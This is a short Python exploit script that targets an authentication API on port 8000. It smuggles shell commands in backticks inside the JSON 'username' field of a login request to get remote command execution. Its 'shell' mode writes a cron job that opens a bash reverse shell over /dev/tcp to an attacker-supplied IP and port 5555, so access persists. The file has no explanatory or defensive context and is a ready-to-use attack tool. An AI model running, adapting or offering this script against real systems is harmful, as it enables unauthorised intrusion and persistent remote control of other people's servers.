import os
import sys
import ssl
import json
import urllib.request as request

def main():
    if(len(sys.argv) < 2):
        print("Usage: %s <host> [\"cmd\" or shell...ip]\n" % sys.argv[0])
        print("Eg:    %s 1.2.3.4 \"id\"" % sys.argv[0])
        print("...    %s 1.2.3.4 shell 5.6.7.8\n" % sys.argv[0])
        return

    host = sys.argv[1]
    cmd = sys.argv[2]

    if(cmd == 'shell'):
        if(len(sys.argv) < 4):
            print("Error: need ip to connect back to for shell")
            return
        ip = sys.argv[3]
        shell = "`echo \"* * * * * bash -i >& /dev/tcp/" + ip + "/5555 0>&1\" > /tmp/cronx; crontab /tmp/cronx`"
        username = shell
    else:
        username = "`" + cmd + "`"
    body = json.dumps({'username':username, 'password':'test', 'mode':'normal'})
    byte = body.encode('utf-8')
    # url = "https://" + host + ":8000" + "/api/core/auth"
    url = "http://" + host + ":8000" + "/api/core/auth"
    try:
        req = request.Request(url)
        req.add_header('Content-Type', 'application/json; charset=utf-8')
        req.add_header('Content-Length', len(byte))
        request.urlopen(req, byte, context=ssl._create_unverified_context()) # ignore the cert
    except Exception as error:
        print("Error: %s" % error)
        return
    print("Done!")

if(__name__ == '__main__'):
    main()
